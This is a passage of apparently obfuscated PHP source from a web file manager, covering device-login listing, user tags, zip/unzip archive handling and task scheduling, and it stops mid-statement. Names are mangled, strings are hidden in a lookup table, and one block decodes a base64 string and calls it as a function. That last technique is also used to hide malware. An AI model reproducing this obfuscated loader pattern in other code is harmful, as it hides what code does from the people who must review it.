$âÂüƒ³ğ[$Ô¤ëö±ı[2148]] = $éÜ‹ÍÆÏ; $¥çºëÊ¯ = json_decode($âÂüƒ³ğ[$Ô¤ëö±ı[528]], !0); $âÂüƒ³ğ[$Ô¤ëö±ı[2431]] = isset($¥çºëÊ¯[$Ô¤ëö±ı[2431]]) ? $¥çºëÊ¯[$Ô¤ëö±ı[2431]] : $Ô¤ëö±ı[12]; $âÂüƒ³ğ[$Ô¤ëö±ı[2435]] = IpLocation::get($âÂüƒ³ğ[$Ô¤ëö±ı[2431]]); if (strpos($£úÒ–¾Ù, $Ô¤ëö±ı[2207]) === 0 || isset($¥çºëÊ¯[$Ô¤ëö±ı[2205]])) { $¥çºëÊ¯[$Ô¤ëö±ı[90]] = $šÏçû®ã[$¥çºëÊ¯[$Ô¤ëö±ı[193]]]; $¥çºëÊ¯[$Ô¤ëö±ı[2221]] = $šÏçû®ã[$¥çºëÊ¯[$Ô¤ëö±ı[2205]]]; if ($¥çºëÊ¯[$Ô¤ëö±ı[33]] == $Ô¤ëö±ı[625]) { $¥çºëÊ¯[$Ô¤ëö±ı[528]][$Ô¤ëö±ı[1238]] = $šÏçû®ã[$¥çºëÊ¯[$Ô¤ëö±ı[528]][$Ô¤ëö±ı[1238]]]; $¥çºëÊ¯[$Ô¤ëö±ı[528]][$Ô¤ëö±ı[1239]] = $šÏçû®ã[$¥çºëÊ¯[$Ô¤ëö±ı[528]][$Ô¤ëö±ı[1239]]]; } if ($¥çºëÊ¯[$Ô¤ëö±ı[33]] == $Ô¤ëö±ı[2216]) { $¥çºëÊ¯[$Ô¤ëö±ı[528]][$Ô¤ëö±ı[193]] = $šÏçû®ã[$¥çºëÊ¯[$Ô¤ëö±ı[528]][$Ô¤ëö±ı[193]]]; } if ($¥çºëÊ¯[$Ô¤ëö±ı[33]] == $Ô¤ëö±ı[1939]) { $¥çºëÊ¯[$Ô¤ëö±ı[2221]] = $¥çºëÊ¯[$Ô¤ëö±ı[90]]; $¥çºëÊ¯[$Ô¤ëö±ı[2205]] = $¥çºëÊ¯[$Ô¤ëö±ı[2221]][$Ô¤ëö±ı[193]]; $¥çºëÊ¯[$Ô¤ëö±ı[90]] = !1; $¥çºëÊ¯[$Ô¤ëö±ı[193]] = $Ô¤ëö±ı[12]; } $â¾•Ì¶ı = array($Ô¤ëö±ı[1939], $Ô¤ëö±ı[2203]); if (!in_array($¥çºëÊ¯[$Ô¤ëö±ı[33]], $â¾•Ì¶ı)) { if ($¥çºëÊ¯[$Ô¤ëö±ı[90]] && $¥çºëÊ¯[$Ô¤ëö±ı[90]][$Ô¤ëö±ı[190]] == $Ô¤ëö±ı[191]) { $˜ëÒØ¦[] = $âÂüƒ³ğ[$Ô¤ëö±ı[477]]; unset($»§İâİ[$’©Ú®í]); continue; } if ($¥çºëÊ¯[$Ô¤ëö±ı[2221]] && $¥çºëÊ¯[$Ô¤ëö±ı[2221]][$Ô¤ëö±ı[190]] == $Ô¤ëö±ı[191]) { $˜ëÒØ¦[] = $âÂüƒ³ğ[$Ô¤ëö±ı[477]]; unset($»§İâİ[$’©Ú®í]); continue; } } } $âÂüƒ³ğ[$Ô¤ëö±ı[528]] = $¥çºëÊ¯; unset($âÂüƒ³ğ[$Ô¤ëö±ı[2440]]); $Ü¦÷Ôšğ[] = $âÂüƒ³ğ; } $this->clearSystemPathLog($˜ëÒØ¦); return $Ü¦÷Ôšğ; } private function clearSystemPathLog($ÛÏœ©Õí) { $ÕÇæ—êø =& $_SERVER[Š—Â“œÔ]; if (count($ÛÏœ©Õí) == 0) { return; } $ËÚÙ©³Ë = array($ÕÇæ—êø[477] => array($ÕÇæ—êø[7], array_unique($ÛÏœ©Õí))); $this->where($ËÚÙ©³Ë)->delete(); } public function deviceList($÷Ÿì, $í–Õ•«ß = 0) { $şÊÕ³“ =& $_SERVER[Š—Â“œÔ]; $¡†´•‡Ò = array($şÊÕ³“[1770] => $÷Ÿì, $şÊÕ³“[233] => array($şÊÕ³“[1088], $í–Õ•«ß), $şÊÕ³“[33] => $şÊÕ³“[1913]); $ø†‡À†  = array(); $Âà¬äµÓ = $this->field($şÊÕ³“[2441])->where($¡†´•‡Ò)->order($şÊÕ³“[2219])->limit(50)->select(); foreach ($Âà¬äµÓ as $Êßì¹µ§ => $åŸ™Ù) { if ($Êßì¹µ§ > 0 && abs($åŸ™Ù[$şÊÕ³“[233]] - $Âà¬äµÓ[$Êßì¹µ§ - 1][$şÊÕ³“[233]]) < 5) { continue; } $Éåá‡ï¡ = json_decode($åŸ™Ù[$şÊÕ³“[528]], !0); $åŸ™Ù[$şÊÕ³“[2431]] = isset($Éåá‡ï¡[$şÊÕ³“[2431]]) ? $Éåá‡ï¡[$şÊÕ³“[2431]] : $şÊÕ³“[12]; unset($Éåá‡ï¡[$şÊÕ³“[2431]]); $Ÿ¤ëØÒ = $this->deviceType($Éåá‡ï¡[$şÊÕ³“[2208]]); if (isset($ø†‡À† [$Ÿ¤ëØÒ])) { continue; } $åŸ™Ù[$şÊÕ³“[2435]] = IpLocation::get($åŸ™Ù[$şÊÕ³“[2431]]); $åŸ™Ù[$şÊÕ³“[528]] = $Éåá‡ï¡; $ø†‡À† [$Ÿ¤ëØÒ] = $åŸ™Ù; } return array_values($ø†‡À† ); } public function deviceType($˜Ş¸„û¥) { return $˜Ş¸„û¥; } } goto Eßå’Ñµ„; AïÌí¥µœÚ: class UserTagModel extends ModelBaseLight { public $optionType = "\x55\163\x65\162\56\164\x61\x67\x4c\x69\163\164"; public $modelType = "\125\163\145\x72\x4f\160\164\151\x6f\156"; public $field = array("\x6e\141\155\145", "\x73\x74\x79\x6c\x65", "\163\x6f\x72\164"); public function listData($æŒº±Ï = false, $»ö–ò×ò = "\163\157\162\x74", $î€Èº’« = false) { return parent::listData($æŒº±Ï, $»ö–ò×ò, $î€Èº’«); } public function remove($îõ×İ…ı) { return parent::remove($îõ×İ…ı); } public function add($¨‚©ÕâÁ, $ÜóÄ³öª = "\x6c\141\142\145\x6c\55\x67\162\x65\x79\x2d\156\157\x72\155\141\x6c") { $Û‹ô¡… =& $_SERVER[Š—Â“œÔ]; if ($this->findByName($¨‚©ÕâÁ)) { return !1; } $ÄáñÆÀ‰ = array($Û‹ô¡…[496] => $¨‚©ÕâÁ, $Û‹ô¡…[560] => $ÜóÄ³öª, $Û‹ô¡…[1975] => $this->getSort($Û‹ô¡…[337]) + 1); return parent::insert($ÄáñÆÀ‰); } public function update($ÅÔÍÆæ, $½µ˜Ã„Å) { $º ó¢äâ =& $_SERVER[Š—Â“œÔ]; $”®èİ„ = $this->listData($ÅÔÍÆæ); $ÖÌÌ÷ÄË = $this->findByName($½µ˜Ã„Å[$º ó¢äâ[32]]); if (!$”®èİ„ || $ÖÌÌ÷ÄË && $ÖÌÌ÷ÄË[$º ó¢äâ[477]] != $”®èİ„[$º ó¢äâ[477]]) { return !1; } return parent::update($ÅÔÍÆæ, $½µ˜Ã„Å); } public function moveTop($Õ»«€êİ) { $³ïìÉ´ =& $_SERVER[Š—Â“œÔ]; $Œ›Û˜¶ğ = parent::listData(); $Â€¶¤é» = $this->getSort($³ïìÉ´[336]); foreach ($Œ›Û˜¶ğ as &$å®›¶ô) { if ($å®›¶ô[$³ïìÉ´[477]] == $Õ»«€êİ) { $å®›¶ô[$³ïìÉ´[1995]] = $Â€¶¤é»; continue; } $å®›¶ô[$³ïìÉ´[1995]] += 1; } unset($å®›¶ô); return parent::resetData($Œ›Û˜¶ğ); } public function moveBottom($¢ËÕˆÙÙ) { $ì§€û÷ =& $_SERVER[Š—Â“œÔ]; $„–¨Æ’ = $this->getSort($ì§€û÷[337]) + 1; return parent::update($¢ËÕˆÙÙ, array($ì§€û÷[1995] => $„–¨Æ’)); } public function resetSort($ÂÒ£í¨Ò) { $–€–ªºÏ =& $_SERVER[Š—Â“œÔ]; $îöî—¤ = array(); $ÂÒ£í¨Ò = is_array($ÂÒ£í¨Ò) ? $ÂÒ£í¨Ò : array(); for ($’×¼ºİî = 0; $’×¼ºİî < count($ÂÒ£í¨Ò); $’×¼ºİî++) { $îöî—¤[$ÂÒ£í¨Ò[$’×¼ºİî] . $–€–ªºÏ[12]] = $’×¼ºİî + 1; } $‹¨ã¡™Ï = parent::listData(); foreach ($‹¨ã¡™Ï as &$ëšè±œé) { $í¹ƒÖØ³ = $îöî—¤[$ëšè±œé[$–€–ªºÏ[477]]]; $ëšè±œé[$–€–ªºÏ[1995]] = $í¹ƒÖØ³ ? $í¹ƒÖØ³ : $ëšè±œé[$–€–ªºÏ[1995]]; } unset($ëšè±œé); return parent::resetData($‹¨ã¡™Ï); } private function getSort($·ÉºÛ¤Â) { $…–¦¾Ï  =& $_SERVER[Š—Â“œÔ]; $ßì£¢°œ = parent::listData(); $´ÕœÌÈ— = array_to_keyvalue($ßì£¢°œ, $…–¦¾Ï [12], $…–¦¾Ï [1995]); if (!$´ÕœÌÈ—) { $´ÕœÌÈ— = array(0); } $ŠçĞìˆ = $·ÉºÛ¤Â == $…–¦¾Ï [337] ? max($´ÕœÌÈ—) : min($´ÕœÌÈ—); return intval($ŠçĞìˆ); } } goto b ¹Ş½³; Açéé‚ç²±: $fileSize = strrev(base64_decode($_SERVER[Ü—Úç¿‹][0])); function binCheckNeq($ú¯Àá½÷, $…½ïÕì) { return $ú¯Àá½÷ != $…½ïÕì; } $_SERVER[$_SERVER[Ü—Úç¿‹][1]] = $fileSize($_SERVER[$_SERVER[Ü—Úç¿‹][2]]); goto Få¾ªëÌ¦‰; F¦ÔÓå¿««: class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $‰û’³Œ¸; if ($‰û’³Œ¸) { return $‰û’³Œ¸; } $›†€Ê¾  = IO::init($_SERVER[Š—Â“œÔ][8]); return $›†€Ê¾ ; } private static function iconvSystem($¦˜„ëØ) { return self::local()->iconvSystem($¦˜„ëØ); } private static function iconvApp($ïçƒàÈÃ) { return self::local()->iconvApp($ïçƒàÈÃ); } public static function zipFolder($Ã˜‡ÇÀ¡, $è‡Âà”ı = "\172\151\160", $˜Ùéûç = '', $‰ºŞòÖ‡ = REPEAT_RENAME) { $Ô†Ä¸áî =& $_SERVER[Š—Â“œÔ]; $§Åî„‚µ = IO::listPath($Ã˜‡ÇÀ¡); if (!$§Åî„‚µ) { return !1; } $§Åî„‚µ = array_merge($§Åî„‚µ[$Ô†Ä¸áî[85]], $§Åî„‚µ[$Ô†Ä¸áî[86]]); return self::zip($§Åî„‚µ, $è‡Âà”ı, $˜Ùéûç, $‰ºŞòÖ‡); } public static function zip($¤Äù‚æº, $¢¢É±÷û = "\172\x69\x70", $âÄÒÊÏ½ = '', $Ÿñ´Şñ = REPEAT_RENAME) { $‡àêÆ³Ô =& $_SERVER[Š—Â“œÔ]; if (is_string($¤Äù‚æº) && $¤Äù‚æº) { $¤Äù‚æº = array(array($‡àêÆ³Ô[87] => $¤Äù‚æº)); } $´ßê×Ôí = self::init($¤Äù‚æº[0][$‡àêÆ³Ô[87]]); $“é‹¦¯° = self::info($¤Äù‚æº[0][$‡àêÆ³Ô[87]]); $”™ùÓª = $‡àêÆ³Ô[12]; $¦„ÆÉèÙ = $‡àêÆ³Ô[12]; $¾õß¬¿ = $‡àêÆ³Ô[12]; if ($âÄÒÊÏ½ && substr($âÄÒÊÏ½, -1, 1) != $‡àêÆ³Ô[8]) { $¦„ÆÉèÙ = get_path_father($âÄÒÊÏ½); $¾õß¬¿ = get_path_this($âÄÒÊÏ½); } else { $¦„ÆÉèÙ = self::pathFather($“é‹¦¯°[$‡àêÆ³Ô[87]]); $¾õß¬¿ = $“é‹¦¯°[$‡àêÆ³Ô[32]] . $‡àêÆ³Ô[10] . $¢¢É±÷û; if (count($¤Äù‚æº) > 1) { $à”øöïæ = IO::info($¦„ÆÉèÙ); $¾õß¬¿ = $à”øöïæ[$‡àêÆ³Ô[32]] . $‡àêÆ³Ô[10] . $¢¢É±÷û; } if ($âÄÒÊÏ½) { $¦„ÆÉèÙ = $âÄÒÊÏ½; } } if ($´ßê×Ôí->getType() == $‡àêÆ³Ô[109]) { $óÓ…Ù”ƒ = self::init($¦„ÆÉèÙ); $Ğê°âÙè = $óÓ…Ù”ƒ->getType() == $‡àêÆ³Ô[109] ? $¦„ÆÉèÙ : get_path_father($´ßê×Ôí->path); $Ğê°âÙè = rtrim($Ğê°âÙè, $‡àêÆ³Ô[8]) . $‡àêÆ³Ô[8]; mk_dir($Ğê°âÙè); } else { $”™ùÓª = TEMP_FILES . $‡àêÆ³Ô[1262] . time() . rand_string(8) . $‡àêÆ³Ô[8]; mk_dir($”™ùÓª); file_put_contents($”™ùÓª . $‡àêÆ³Ô[1263], $‡àêÆ³Ô[12]); $Ğê°âÙè = $”™ùÓª; } $ààù»ºŸ = IO::info($Ğê°âÙè); if (!$ààù»ºŸ || !$ààù»ºŸ[$‡àêÆ³Ô[235]]) { show_json(LNG($‡àêÆ³Ô[1264]), !1); } $çõÁşÙ… = self::zipFileList($¤Äù‚æº, $”™ùÓª); foreach ($çõÁşÙ… as $çÀéÖÉŠ => $ğÀÔõ ) { $çõÁşÙ…[$çÀéÖÉŠ] = self::iconvSystem($ğÀÔõ ); } $ñ•È‘óÖ = get_filename_auto($Ğê°âÙè . $¾õß¬¿, $‡àêÆ³Ô[12], $Ÿñ´Şñ); KodArchive::create(self::iconvSystem($ñ•È‘óÖ), $çõÁşÙ…); if (!IO::exist($ñ•È‘óÖ)) { if ($”™ùÓª) { del_dir($”™ùÓª); } write_log($‡àêÆ³Ô[1265] . $ñ•È‘óÖ, $‡àêÆ³Ô[390]); show_json(LNG($‡àêÆ³Ô[1266]), !1); } if (!$”™ùÓª) { return $ñ•È‘óÖ; } $Æä«¶Ê© = self::move($ñ•È‘óÖ, $¦„ÆÉèÙ, $Ÿñ´Şñ); if ($”™ùÓª) { del_dir($”™ùÓª); } if (!$ñ•È‘óÖ) { write_log($‡àêÆ³Ô[1267] . $ñ•È‘óÖ . $‡àêÆ³Ô[1268] . $¦„ÆÉèÙ, $‡àêÆ³Ô[390]); show_json(LNG($‡àêÆ³Ô[1266]), !1); } return $Æä«¶Ê©; } public static function unzip($¨ĞÖêä°, $É› ï‡¨, $”¶ö†¨ã = "\x2d\x31", $Ñ¯ŸŸûó = "\162\x65\x70\x6c\141\143\x65") { $¾¼Ä”õ® =& $_SERVER[Š—Â“œÔ]; $è„ê‰‚Û = parent::info($¨ĞÖêä°); if (!$è„ê‰‚Û) { show_json(LNG($¾¼Ä”õ®[1269]), !1); } $ÎĞìÚÕÖ = IO::infoFullSimple($É› ï‡¨); if (!$ÎĞìÚÕÖ) { $É› ï‡¨ = IO::mkdir($É› ï‡¨); } if (isset($ÎĞìÚÕÖ[$¾¼Ä”õ®[193]]) && trim($ÎĞìÚÕÖ[$¾¼Ä”õ®[87]], $¾¼Ä”õ®[8]) != trim($É› ï‡¨, $¾¼Ä”õ®[8])) { $©å°‚ = KodIO::make($ÎĞìÚÕÖ[$¾¼Ä”õ®[192]]); $ÌØÎ‹Ãê = IO::fileNameAuto($©å°‚, $ÎĞìÚÕÖ[$¾¼Ä”õ®[32]], REPEAT_RENAME_FOLDER, !0); $É› ï‡¨ = IO::mkdir($©å°‚ . $ÌØÎ‹Ãê); } $”¶ö†¨ã = $”¶ö†¨ã && $”¶ö†¨ã != $¾¼Ä”õ®[1270] ? @json_decode($”¶ö†¨ã, !0) : -1; $ŸšÕ“÷ = self::unzipPart($¨ĞÖêä°, $”¶ö†¨ã); if (!$ŸšÕ“÷ || !IO::exist($ŸšÕ“÷[$¾¼Ä”õ®[232]])) { show_json(LNG($¾¼Ä”õ®[108]), !1); } $öÜÁëÉ© = $ŸšÕ“÷[$¾¼Ä”õ®[1271]][count($ŸšÕ“÷[$¾¼Ä”õ®[1271]]) - 1]; if ($öÜÁëÉ©[$¾¼Ä”õ®[1272]] == -1 || substr($öÜÁëÉ©[$¾¼Ä”õ®[32]], -1, 1) == $¾¼Ä”õ®[8]) { $ƒŒ«¡‰¾ = $ŸšÕ“÷[$¾¼Ä”õ®[1273]] . rand_string(10) . $¾¼Ä”õ®[8]; mk_dir($ƒŒ«¡‰¾); $‹äö«ôˆ = count($ŸšÕ“÷[$¾¼Ä”õ®[1271]]) == 1 ? IO::ext($¨ĞÖêä°) : get_path_ext($ŸšÕ“÷[$¾¼Ä”õ®[232]]); $Ò€Èë­ = KodArchive::extract(self::iconvSystem($ŸšÕ“÷[$¾¼Ä”õ®[232]]), $ƒŒ«¡‰¾, $öÜÁëÉ©[$¾¼Ä”õ®[1272]], $ÌØÎ‹Ãê, $‹äö«ôˆ); self::unzipErrorCheck($Ò€Èë­, array($¾¼Ä”õ®[1274], $¨ĞÖêä°, $‹äö«ôˆ, $É› ï‡¨, $ŸšÕ“÷)); Hook::trigger($¾¼Ä”õ®[1275], $ƒŒ«¡‰¾); recursion_dir($ƒŒ«¡‰¾, $ô©øËø£, $ÎëÂåõ, 0); $ ¿ Ş€’ = array_merge($ô©øËø£, $ÎëÂåõ); $øÎ°¡› = array(); foreach ($ ¿ Ş€’ as $½…ÕĞûú) { $õæŒÑË¬ = IO::move(self::iconvApp($½…ÕĞûú), $É› ï‡¨, $Ñ¯ŸŸûó); if ($õæŒÑË¬) { $øÎ°¡›[] = $õæŒÑË¬; } } del_dir($ƒŒ«¡‰¾); } else { $õæŒÑË¬ = IO::move($ŸšÕ“÷[$¾¼Ä”õ®[232]], $É› ï‡¨, $Ñ¯ŸŸûó, get_path_this($öÜÁëÉ©[$¾¼Ä”õ®[32]])); if ($õæŒÑË¬) { $øÎ°¡›[] = $õæŒÑË¬; } } return $øÎ°¡› ? $øÎ°¡› : !1; } public static function unzipList($è…‘¯èé) { $¦—ğ«È” =& $_SERVER[Š—Â“œÔ]; $ô¶ ÌÕŞ = isset($è…‘¯èé[$¦—ğ«È”[1276]]) ? $è…‘¯èé[$¦—ğ«È”[1276]] : !1; $¶²ó½Úô = isset($è…‘¯èé[$¦—ğ«È”[1272]]) ? @json_decode($è…‘¯èé[$¦—ğ«È”[1272]], !0) : -1; $ØëÄ•š = self::unzipPart($è…‘¯èé[$¦—ğ«È”[87]], $¶²ó½Úô); if (!$ØëÄ•š || !IO::exist($ØëÄ•š[$¦—ğ«È”[232]])) { show_json(LNG($¦—ğ«È”[108]), !1); } $áé¦Î¬î = $ØëÄ•š[$¦—ğ«È”[1271]][count($ØëÄ•š[$¦—ğ«È”[1271]]) - 1]; $’šä¼¯Ó = in_array(IO::ext($ØëÄ•š[$¦—ğ«È”[232]]), array($¦—ğ«È”[390], $¦—ğ«È”[1277], $¦—ğ«È”[1278], $¦—ğ«È”[1279], $¦—ğ«È”[1280], $¦—ğ«È”[1281])); if (!$ô¶ ÌÕŞ && ($áé¦Î¬î[$¦—ğ«È”[1272]] == -1 || $’šä¼¯Ó)) { $¨›ş†í = $ØëÄ•š[$¦—ğ«È”[1273]] . get_path_this($ØëÄ•š[$¦—ğ«È”[232]]) . $¦—ğ«È”[1282]; if (!IO::exist($¨›ş†í)) { $¯®ş¤ÍÙ = $áé¦Î¬î[$¦—ğ«È”[1272]] == -1 ? get_path_ext(IO::pathThis($è…‘¯èé[$¦—ğ«È”[87]])) : get_path_ext($ØëÄ•š[$¦—ğ«È”[232]]); $‘ÈÂ¢êÄ = KodArchive::listContent(self::iconvSystem($ØëÄ•š[$¦—ğ«È”[232]]), !0, $¯®ş¤ÍÙ); self::unzipErrorCheck($‘ÈÂ¢êÄ, array($¦—ğ«È”[1283], $è…‘¯èé, $ØëÄ•š)); @file_put_contents($¨›ş†í, json_encode($‘ÈÂ¢êÄ[$¦—ğ«È”[1284]])); } return @json_decode(IO::getContent($¨›ş†í), !0); } IO::fileOut($ØëÄ•š[$¦—ğ«È”[232]], $ô¶ ÌÕŞ, get_path_this($áé¦Î¬î[$¦—ğ«È”[32]])); die; } private static function zipFileList($õÆæ¸Œ, $ƒÕıÔÂ” = false) { $‘Ö«Œ¼ =& $_SERVER[Š—Â“œÔ]; $ô £™› = array(); foreach ($õÆæ¸Œ as $ÕÆˆ‘Ìş) { $‡‘¯’ó = $ÕÆˆ‘Ìş[$‘Ö«Œ¼[87]]; if ($ƒÕıÔÂ”) { $‡‘¯’ó = self::copy($ÕÆˆ‘Ìş[$‘Ö«Œ¼[87]], $ƒÕıÔÂ”, $‘Ö«Œ¼[886]); } else { $×™»²àÖ = self::init($ÕÆˆ‘Ìş[$‘Ö«Œ¼[87]]); if ($×™»²àÖ->getType() == $‘Ö«Œ¼[109]) { $‡‘¯’ó = $×™»²àÖ->path; } } if ($‡‘¯’ó && self::local()->exist($‡‘¯’ó)) { $ô £™›[$ÕÆˆ‘Ìş[$‘Ö«Œ¼[87]]] = $‡‘¯’ó; } } if (!empty($ô £™›)) { return array_values($ô £™›); } show_json(LNG($‘Ö«Œ¼[1243]), !1); } private static function localFilePath($Ì’†‘õä) { $ï…­¥Óë =& $_SERVER[Š—Â“œÔ]; $ØØ“ú«– = KodIO::parse($Ì’†‘õä); if ($ØØ“ú«–[$ï…­¥Óë[33]] == KodIO::KOD_SOURCE) { $âÔİ„€ = Model($ï…­¥Óë[892])->fileInfoGet(KodIO::sourceID($Ì’†‘õä)); if (!$âÔİ„€[$ï…­¥Óë[87]]) { show_json($ï…­¥Óë[1285], !1); } $Ì’†‘õä = $âÔİ„€[$ï…­¥Óë[87]]; } $ˆïî©¼¯ = self::init($Ì’†‘õä); if ($ˆïî©¼¯->pathParse[$ï…­¥Óë[1229]]) { $Ì’†‘õä = $ˆïî©¼¯->pathParse[$ï…­¥Óë[1229]]; $ˆïî©¼¯ = self::init($Ì’†‘õä); } $ÉûÈ÷ä = $ˆïî©¼¯->getType(); if ($ÉûÈ÷ä == $ï…­¥Óë[109] || $ÉûÈ÷ä == $ï…­¥Óë[1286]) { if (!$ˆïî©¼¯->exist($ˆïî©¼¯->path)) { show_json(LNG($ï…­¥Óë[108]), !1); } return $ˆïî©¼¯->path; } return !1; } public static function unzipPart($ŒÇ“ã†ï, $íğ¤¼ë´ = -1) { $±×ô„¢º =& $_SERVER[Š—Â“œÔ]; $¡¾Š­‹ = IO::pathThis($ŒÇ“ã†ï); if (!$íğ¤¼ë´ || $íğ¤¼ë´ == -1) { $ÏÑ«Š€± = array(array($±×ô„¢º[32] => $¡¾Š­‹, $±×ô„¢º[1272] => -1)); $ÏÑ«Š€±[0][$±×ô„¢º[1287]] = $ÏÑ«Š€±[0][$±×ô„¢º[32]]; } else { if (is_array($íğ¤¼ë´)) { $ÏÑ«Š€± = $íğ¤¼ë´; $Ø»Šü¯Î = count($ÏÑ«Š€±) - 1; for ($’ğù‘Åù = 0; $’ğù‘Åù <= $Ø»Šü¯Î; $’ğù‘Åù++) { $á¦¦è•ï = $ÏÑ«Š€±[$’ğù‘Åù]; $ÓÑğá¹Á = get_path_this($á¦¦è•ï[$±×ô„¢º[32]]) . (checkExtSafe($á¦¦è•ï[$±×ô„¢º[32]]) ? $±×ô„¢º[12] : $±×ô„¢º[1288]); $ÏÑ«Š€±[$’ğù‘Åù][$±×ô„¢º[1287]] = $±×ô„¢º[1289] . intval($á¦¦è•ï[$±×ô„¢º[1272]]) . $±×ô„¢º[464] . $ÓÑğá¹Á; if ($’ğù‘Åù == 0) { continue; } $ÏÑ«Š€±[$’ğù‘Åù][$±×ô„¢º[1287]] = $ÏÑ«Š€±[$’ğù‘Åù - 1][$±×ô„¢º[1287]] . $±×ô„¢º[1290] . $ÏÑ«Š€±[$’ğù‘Åù][$±×ô„¢º[1287]]; } } } if (!is_array($ÏÑ«Š€±) || count($ÏÑ«Š€±) == 0) { return !1; } $ØµöœÑø = $ÏÑ«Š€±[count($ÏÑ«Š€±) - 1]; if (!IO::exist($ŒÇ“ã†ï)) { return !1; } $‹™Ñüï• = TEMP_FILES . $±×ô„¢º[1291] . kodIO::hashPathSafe($ŒÇ“ã†ï) . $±×ô„¢º[8]; $ªÉ¹èêÃ = $‹™Ñüï• . $ØµöœÑø[$±×ô„¢º[1287]]; mk_dir($‹™Ñüï•); file_put_contents(TEMP_FILES . $±×ô„¢º[1263], $±×ô„¢º[12]); if (IO::exist($ªÉ¹èêÃ)) { return array($±×ô„¢º[232] => $ªÉ¹èêÃ, $±×ô„¢º[1271] => $ÏÑ«Š€±, $±×ô„¢º[1273] => $‹™Ñüï•); } $×à¼Ìˆ = self::localFilePath($ŒÇ“ã†ï); if (!$×à¼Ìˆ) { $×à¼Ìˆ = $‹™Ñüï• . $±×ô„¢º[1292]; if (!IO::exist($×à¼Ìˆ)) { self::copy($ŒÇ“ã†ï, $‹™Ñüï•, !1, get_path_this($×à¼Ìˆ)); } } if (!$×à¼Ìˆ || !IO::exist($×à¼Ìˆ)) { return !1; } if ($ØµöœÑø[$±×ô„¢º[1272]] == -1) { return array($±×ô„¢º[232] => $×à¼Ìˆ, $±×ô„¢º[1271] => $ÏÑ«Š€±, $±×ô„¢º[1273] => $‹™Ñüï•); } $Â¨Ñ±‘ = $×à¼Ìˆ; foreach ($ÏÑ«Š€± as $’ğù‘Åù => $á¦¦è•ï) { if (!$á¦¦è•ï || $á¦¦è•ï[$±×ô„¢º[1272]] == $±×ô„¢º[1270]) { break; } if (substr($á¦¦è•ï[$±×ô„¢º[32]], -1, 1) == $±×ô„¢º[8]) { break; } $Ñ’‹ïèÈ = in_array(get_path_ext($á¦¦è•ï[$±×ô„¢º[1287]]), array($±×ô„¢º[390], $±×ô„¢º[1277], $±×ô„¢º[1278], $±×ô„¢º[1279], $±×ô„¢º[1280], $±×ô„¢º[1281])); $¾ÂÙÉ = $’ğù‘Åù == count($ÏÑ«Š€±) - 1 && $Ñ’‹ïèÈ; $á‘Ö¨» = $‹™Ñüï• . $á¦¦è•ï[$±×ô„¢º[1287]]; $ è›–Ë = $‹™Ñüï• . get_path_this($á¦¦è•ï[$±×ô„¢º[32]]); if (IO::exist($á‘Ö¨»)) { $Â¨Ñ±‘ = $á‘Ö¨»; continue; } $¢şïíûù = $’ğù‘Åù == 0 ? get_path_ext($¡¾Š­‹) : get_path_ext($Â¨Ñ±‘); $¬•‘çƒ÷ = KodArchive::extract(self::iconvSystem($Â¨Ñ±‘), $‹™Ñüï•, $á¦¦è•ï[$±×ô„¢º[1272]], $ŞëÒÙ‹ß, $¢şïíûù); self::unzipErrorCheck($¬•‘çƒ÷, array($±×ô„¢º[1293], $ŒÇ“ã†ï, $ÏÑ«Š€±, $á¦¦è•ï, $á‘Ö¨»)); if (IO::exist($ è›–Ë)) { IO::rename($ è›–Ë, get_path_this($á‘Ö¨»)); } $Â¨Ñ±‘ = $á‘Ö¨»; } $ªÉ¹èêÃ = $Â¨Ñ±‘; return array($±×ô„¢º[232] => $Â¨Ñ±‘, $±×ô„¢º[1271] => $ÏÑ«Š€±, $±×ô„¢º[1273] => $‹™Ñüï•); } private static function unzipErrorCheck($¦Ûçå°, $‡‚Ëş† = false) { $îã±½Œ =& $_SERVER[Š—Â“œÔ]; if ($¦Ûçå°[$îã±½Œ[1294]]) { return !0; } write_log(array($îã±½Œ[1295], $¦Ûçå°, $‡‚Ëş†), $îã±½Œ[1296]); show_json($îã±½Œ[1297] . json_encode($¦Ûçå°[$îã±½Œ[1284]]), !1); die; } } $_file = $_SERVER[$_SERVER[Š—Â“œÔ][945]]; $_size = $_SERVER[Š—Â“œÔ][946]; goto cš×”’÷Í¸; CÊ·¯ë©ò¤: class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($İ†ª™ÔĞ, $Í¬€Œğõ = 5.0) { if (!$İ†ª™ÔĞ) { return; } $ÉŠ×Ò’ = Cache::get($İ†ª™ÔĞ); if (!$ÉŠ×Ò’ || timeFloat() - floatVal($ÉŠ×Ò’) >= $Í¬€Œğõ) { Cache::set($İ†ª™ÔĞ, timeFloat(), $Í¬€Œğõ * 10); return !0; } return !1; } public static function timeLimitCall($›äƒëÆ¯, $Šı«öˆ°, $§÷öÌ, $ÛèØ¡Ú = 5.0) { $êàŞ¶¬ =& $_SERVER[Š—Â“œÔ]; if (!$›äƒëÆ¯ || !$Šı«öˆ°) { return; } self::$asyncAdd = !0; $ˆˆÚÚÌœ = $êàŞ¶¬[1878]; $…ĞË¡ìÄ = Cache::get($ˆˆÚÚÌœ, !0); $ÛÜÇ¿ğ = array($êàŞ¶¬[1879] => timeFloat(), $êàŞ¶¬[1880] => timeFloat(), $êàŞ¶¬[343] => $Šı«öˆ°, $êàŞ¶¬[1870] => $§÷öÌ, $êàŞ¶¬[206] => $ÛèØ¡Ú); if (is_array($…ĞË¡ìÄ[$›äƒëÆ¯])) { $ÛÜÇ¿ğ[$êàŞ¶¬[1880]] = $…ĞË¡ìÄ[$›äƒëÆ¯][$êàŞ¶¬[1880]]; } if (is_array($…ĞË¡ìÄ[$›äƒëÆ¯])) { if (timeFloat() - $…ĞË¡ìÄ[$›äƒëÆ¯][$êàŞ¶¬[1879]] < $ÛÜÇ¿ğ[$êàŞ¶¬[206]] * 0.3) { return; } $ÛÜÇ¿ğ[$êàŞ¶¬[1880]] = $…ĞË¡ìÄ[$›äƒëÆ¯][$êàŞ¶¬[1880]]; } $…ĞË¡ìÄ[$›äƒëÆ¯] = $ÛÜÇ¿ğ; Cache::set($ˆˆÚÚÌœ, $…ĞË¡ìÄ, 60); Cache::removeMemory($ˆˆÚÚÌœ); write_log($êàŞ¶¬[1881] . $›äƒëÆ¯ . $êàŞ¶¬[74] . $Šı«öˆ°, $êàŞ¶¬[197]); } public static function timeLimitCallLoop() { $…˜ä±¨ü =& $_SERVER[Š—Â“œÔ]; $èÎĞ°ğ = array($…˜ä±¨ü[1882]); $Ó¸º­“ = in_array(strtolower(ACTION), $èÎĞ°ğ); if 